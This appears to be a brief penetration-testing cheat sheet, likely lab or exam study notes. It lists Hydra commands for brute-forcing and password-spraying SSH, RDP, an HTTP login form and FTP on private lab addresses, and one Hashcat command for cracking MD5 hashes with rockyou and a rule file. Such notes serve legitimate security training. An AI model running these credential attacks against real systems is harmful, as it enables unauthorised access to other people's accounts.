
| **Brute force** | **Description** |
| ---- | ---- |
| `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201` | SSH |
| `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202` | RDP - Password spraying |
| `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` | HTTP Form |
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.213.61` | FTP |

| **Hash cracking** | **Description** |
| ---- | ---- |
| `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force` | Hashcat with rule |
|  |  |
